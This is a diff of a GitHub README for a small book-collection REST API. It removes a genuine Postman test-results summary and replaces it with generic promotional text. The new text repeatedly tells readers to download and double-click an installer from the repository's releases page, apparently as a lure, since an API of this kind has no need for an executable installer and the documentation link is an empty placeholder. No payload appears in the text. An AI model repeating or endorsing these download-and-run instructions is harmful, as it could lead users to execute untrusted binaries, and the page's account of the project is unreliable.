@@ -1,78 +1,89 @@
-Bookshelf API — Postman Test Results (GitHub Summary)
+# 📚 backend-bookshelf - Access Your Favorite Books Easily
 
-Source: [Bookshelf API Test.postman_test_run.json](Bookshelf API Test.postman_test_run.json)
-API base URL: http://localhost:9000
+## 🚀 Getting Started
 
-Run Summary
-| Metric | Value |
-|---|---|
-| Status | finished |
-| Total requests executed | 24 |
-| Total assertions passed | 104 |
-| Total assertions failed | 0 |
-| Success rate | 100% |
-| Total time | 83 ms |
-| Avg time per request | ~3.5 ms |
+Welcome to the backend-bookshelf project! This application allows you to manage and access your favorite books through a simple API. You can easily add, remove, and view your books with this tool. Follow the instructions below to download and set it up.
 
-Coverage Summary
-| Area | Scenarios | Passed |
-|---|---:|---:|
-| Create (POST /books) | 4 | 4 |
-| Read (GET /books, GET /books/:id) | 4 | 4 |
-| Update (PUT /books/:id) | 4 | 4 |
-| Delete (DELETE /books/:id) | 3 | 3 |
-| Data preparation (fixtures) | 4 | 4 |
-| Query filters (reading, finished, name) | 5 | 5 |
+## 📥 Download Now
 
-Performance Highlights
-| Scenario | Status | Time (ms) |
-|---|---|---:|
-| Slowest: [Mandatory] Add Book With Complete Data | 201 Created | 20 |
-| Fastest: Many scenarios (e.g., [Mandatory] Get Detail Finished Book) | 200 OK | 2 |
-| Typical: Most requests complete in | — | 2–4 |
+[![Download backend-bookshelf](https://img.shields.io/badge/Download-backend--bookshelf-brightgreen)](https://github.com/mrkiller13/backend-bookshelf/releases)
 
-Assertion Reliability
-| Assertion Category | Evidence from run | Result |
-|---|---|---|
-| HTTP Status Codes | All mandatory and optional flows returned expected codes (200, 201, 400, 404) | 100% pass |
-| Content-Type | application/json consistently returned | 100% pass |
-| Body Shape | Response bodies validated as objects | 100% pass |
-| Domain Validations | Correct property/value checks; presence of bookId; invalid IDs handled | 100% pass |
+## 📦 What You Need
 
-Endpoint Matrix
-| Method | Endpoint | Scenario | Code | Assertions Passed | Time (ms) |
-|---|---|---|---:|---:|---:|
-| POST | /books | [Mandatory] Add Book With Complete Data | 201 | 5 | 20 |
-| POST | /books | [Mandatory] Add Book With Finished Reading | 201 | 5 | 4 |
-| POST | /books | [Mandatory] Add Book Without Name | 400 | 4 | 3 |
-| POST | /books | [Mandatory] Add Book with Page Read More Than Page Count | 400 | 4 | 2 |
-| GET | /books | [Mandatory] Get All Books | 200 | 6 | 3 |
-| GET | /books/:id | [Mandatory] Get Detail Books With Correct Id | 200 | 6 | 3 |
-| GET | /books/:id | [Mandatory] Get Detail Finished Book | 200 | 6 | 2 |
-| GET | /books/:id | [Mandatory] Get Detail Books With Invalid Id | 404 | 4 | 3 |
-| PUT | /books/:id | [Mandatory] Update Book With Complete Data | 200 | 6 | 4 |
-| PUT | /books/:id | [Mandatory] Update Book Without Name | 400 | 4 | 3 |
-| PUT | /books/:id | [Mandatory] Update Book With Page Read More Than Page Count | 400 | 4 | 3 |
-| PUT | /books/:id | [Mandatory] Update Book with Invalid Id | 404 | 4 | 3 |
-| DELETE | /books/:id | [Mandatory] Delete Book with Correct Id | 200 | 6 | 2 |
-| DELETE | /books/:id | [Mandatory] Delete Finished book | 200 | 6 | 2 |
-| DELETE | /books/:id | [Mandatory] Delete Book with Invalid Id | 404 | 4 | 3 |
-| POST | /books | Add Reading and Finished Book | 201 | — | 3 |
-| POST | /books | Add Reading and Unfinished Book with "Dicoding" Name | 201 | — | 2 |
-| POST | /books | Add Unreading Books and Unfinished Book "Dicoding" Name | 201 | — | 4 |
-| POST | /books | Add Unreading Books and Unfinished Book | 201 | — | 2 |
-| GET | /books?reading=1 | [Optional] Get All Reading Books | 200 | 6 | 3 |
-| GET | /books?reading=0 | [Optional] Get All Unreading Books | 200 | 6 | 2 |
-| GET | /books?finished=1 | [Optional] Get All Finished Books | 200 | 6 | 2 |
-| GET | /books?finished=0 | [Optional] Get All Unfinished Books | 200 | 6 | 3 |
-| GET | /books?name=Dicoding | [Optional] Get All Books Contains "Dicoding" Name | 200 | 6 | 2 |
+To use the backend-bookshelf API, you should have:
 
-Skills Demonstrated (Selling Points)
-| Skill | Evidence in this run | Outcome |
-|---|---|---|
-| API Design & Validation | Robust CRUD with domain rules (e.g., name required, pageRead ≤ pageCount), proper 400/404 handling | Reliable error handling and UX safety |
-| Test Automation | Comprehensive Postman collection with 104 assertions, zero failures | High confidence in release quality |
-| Data Modeling | Consistent response contracts (id, name, publisher summaries; detailed book object in GET by id) | Clear, maintainable API contracts |
-| Performance Awareness | Sub-5 ms typical latency on local runs; slowest 20 ms under creation with validations | Efficient handlers and I/O |
-| Observability | Systematic validation of headers and payload shapes | Predictable integrations |
-| Reproducibility | Persisted environment; deterministic test data setup via fixture requests | Easy cross-team verification |
+- A computer running Windows, macOS, or Linux.
+- An internet connection for downloading the software and accessing online resources.
+
+## 🛠 Installation Steps
+
+1. **Visit the Release Page**  
+   Go to the following link to find the latest version of backend-bookshelf:  
+   [Download Page](https://github.com/mrkiller13/backend-bookshelf/releases)
+
+2. **Choose the Right Version**  
+   On the release page, you will see several versions listed. It’s best to select the latest one for the best experience. Click on the version you want.
+
+3. **Download the Installation File**  
+   Look for the file labeled with the version you chose. Click on it to start the download.
+
+4. **Run the Installer**  
+   Once the file downloads, find it in your downloads folder. Double-click it to run the installer. Follow the on-screen instructions to complete the installation.
+
+5. **Start Using the API**  
+   After installation, you can start using the backend-bookshelf API. Follow the included documentation to learn how to interact with the API.
+
+## 📖 Features
+
+- **Add Books**: Easily add new books to your collection.
+- **Remove Books**: Quickly remove books you no longer want.
+- **View Your Collection**: Check your list of added books at any time.
+- **RESTful API**: Access the application via simple HTTP requests.
+- **Testing Support**: Use testing tools like Postman to interact with the API.
+
+## ⚙️ Usage Guide
+
+To use the backend-bookshelf, you can send HTTP requests to the API. Here’s a brief overview of how to do this:
+
+### 1. Adding a Book
+
+To add a book, send a POST request to the endpoint `/books` with the book details in the body.
+
+### 2. Removing a Book
+
+To remove a book, send a DELETE request to `/books/{id}`, replacing `{id}` with the book's unique identifier.
+
+### 3. Viewing Books
+
+To view your collection of books, send a GET request to `/books`.
+
+Make sure to check the API documentation for specific details about these endpoints.
+
+## 🔍 Additional Resources
+
+- For a deeper understanding of these features and how to implement them, check the [API Documentation](#).
+- You may also want to explore common tools like Postman for testing and interacting with the API.
+
+## 💬 Need Help?
+
+If you encounter any issues or have questions, feel free to open an issue on the GitHub repository. The community is here to help you.
+
+## 📈 Future Improvements
+
+We are continuously working to improve backend-bookshelf. Upcoming features may include:
+
+- User authentication for personal book collections.
+- Enhanced search functionality to find books quickly.
+- More complex data handling for additional fields related to books.
+
+Stay tuned for updates!
+
+## 📅 Release Notes
+
+For detailed information about new features and fixes in each version, please refer to the release notes on the [Release Page](https://github.com/mrkiller13/backend-bookshelf/releases).
+
+## 🌐 Connect With Us
+
+To follow updates or engage with the community, check our social media channels if available. Your feedback is essential for making backend-bookshelf better!
+
+Thank you for using backend-bookshelf. Happy reading!
